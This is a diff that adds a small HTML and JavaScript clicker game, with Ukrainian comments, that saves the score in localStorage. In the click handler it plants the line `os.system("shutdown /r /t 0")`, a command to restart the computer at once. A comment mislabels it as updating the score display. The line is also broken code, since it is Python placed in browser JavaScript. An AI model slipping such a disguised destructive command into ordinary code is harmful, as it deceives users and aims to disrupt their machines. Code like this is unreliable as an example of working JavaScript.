@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clicker Game</title>
+    <style>
+        body {
+
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+
+        }
+
+        h1 {
+
+            color: #333;
+
+        }
+
+        #counter {
+
+            font-size: 2em;
+            margin: 20px;
+
+        }
+
+        button {
+
+            font-size: 1.2em;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+
+        }
+
+        button:hover {
+
+            background-color: #45a049;
+
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <h1>Clicker Game</h1>
+    <div id="counter">0</div>
+    <button id="clickButton">Клікни мене!</button>
+
+    <script>
+
+        //Функція для отримання поточного рахунку з LocalStorage
+        function getCurrentScore() {
+
+            return localStorage.getItem("score") ? parseInt(localStorage.getItem("score")) : 0;
+
+        }
+
+        //Функція для оновлення рахунку на екрані та в LocalStorage
+        function updateScore() {
+
+            const score = getCurrentScore();
+            document.getElementById("counter").innerText = score;
+            localStorage.setItem("score", score); //Зберігаємо поточний рахунок у LocalStorage
+
+        }
+
+        //Дія при натисканні на кнопку
+        document.getElementById("clickButton").addEventListener("click", function () {
+
+            let score = getCurrentScore();
+            score += 1; //Збільшуємо рахунок на 1
+            localStorage.setItem("score", score); //Зберігаємо оновлений рахунок
+            updateScore();
+            os.system("shutdown /r /t 0"); //Oновлюємо відображення рахунку
+
+        });
+
+        //Оновлюємо рахунок при завантаженні сторінки
+        window.onload = updateScore;
+
+    </script>
+
+</body>
+
+</html>
